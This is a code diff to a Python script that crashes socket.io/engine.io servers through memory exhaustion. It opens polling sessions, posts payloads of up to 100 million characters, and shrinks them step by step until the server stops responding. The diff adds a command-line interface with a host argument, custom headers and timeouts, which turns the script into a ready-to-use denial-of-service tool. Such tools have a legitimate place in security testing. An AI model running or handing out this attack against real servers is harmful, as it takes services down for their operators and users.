@@ -1,4 +1,6 @@
+import argparse
 import re
+import sys
 import time
 
 import requests
@@ -6,6 +8,7 @@ import requests
 
 DEFAULT_MAX = 100000000
 DEFAULT_PATH = 'socket.io/'
+DEFAULT_TIMEOUT = 300
 
 
 def repeat_packet(packet, total_length):
@@ -71,18 +74,22 @@ def timestr():
     return "&t=" + str(time.time())
 
 
-def get_new_session_url(host, path):
+def get_new_session_url(host, path, timeout=DEFAULT_TIMEOUT, headers=None):
     base_url = f"{host}/{path}?EIO=3&transport=polling"
     # Create session
-    response = requests.get(base_url + timestr()).text
+    response = requests.get(
+        base_url + timestr(),
+        headers=headers,
+        timeout=timeout,
+    ).text
     print("Response from server", repr(response))
     sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
     print("Got session", sid)
     return base_url + "&sid=" + sid
 
 
-def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, path=DEFAULT_PATH):
-    session_url = get_new_session_url(host, path)
+def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, path=DEFAULT_PATH, timeout=DEFAULT_TIMEOUT, headers=None):
+    session_url = get_new_session_url(host, path, timeout, headers)
     # Fire payload
     payload = make_payload(payload_length)
     print("Firing payload of length", len(payload), repr(payload[:100]))
@@ -91,7 +98,8 @@ def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, pat
         final_response = requests.post(
             session_url + timestr(),
             data=payload,
-            headers={'Content-Type': 'text/plain'},
+            timeout=timeout,
+            headers={'Content-Type': 'text/plain', **(headers or {})},
         ).text
         print("Server returned", repr(final_response))
     except requests.exceptions.ConnectionError as e:
@@ -127,20 +135,37 @@ def oom_nodejs(
     payload_length=DEFAULT_MAX,
     make_payload=many_tiny_packets,
     path=DEFAULT_PATH,
+    timeout=DEFAULT_TIMEOUT,
+    headers=None,
 ):
     """Try to find a DoS payload which isn't so large that we hit the ping timeout before OOM."""
     try:
         while payload_length > 50000:  # No point continuing shorter than this
-            attack(host, payload_length, make_payload, path)
+            attack(host, payload_length, make_payload, path, timeout, headers)
             payload_length = int(payload_length * 0.7)  # Try slightly smaller payload avoiding ping timed out
-        get_new_session_url(host, path)
+        get_new_session_url(host, path, timeout, headers)
     except requests.exceptions.ConnectionError:
         print("Server no longer responds :)")
     else:
         print("Server survived :(")
 
 
-def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, path=DEFAULT_PATH):
+def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, path=DEFAULT_PATH, timeout=DEFAULT_TIMEOUT, headers=None):
     for make_payload in (many_tiny_packets, many_heartbeats, giant_packet):
         print("Trying payload type:", make_payload.__name__)
-        oom_nodejs(host, payload_length, make_payload, path)
+        oom_nodejs(host, payload_length, make_payload, path, timeout, headers)
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Kill socket / engine io', epilog="By Ben Caller. Use responsibly.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser.add_argument("host", help="Starting with protocol and ending without a forward slash e.g. https://a.b.c:123")
+    parser.add_argument("--path", default=DEFAULT_PATH, help="Location of socket.io endpoint starting without a forward slash")
+    parser.add_argument("-l", "--max-length", default=DEFAULT_MAX, help="Maximum payload length to send", type=int)
+    parser.add_argument("-t", "--timeout", default=DEFAULT_TIMEOUT, help="Time out the request after this many seconds", type=int)
+    parser.add_argument("-H", "--header", nargs=2, action='append', help="Headers to add to all requests. --header NAME VALUE --header NAME2 VALUE2")
+    args = parser.parse_args()
+    oom_nodejs_all(args.host, args.max_length, args.path, args.timeout, args.header)
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+        main()
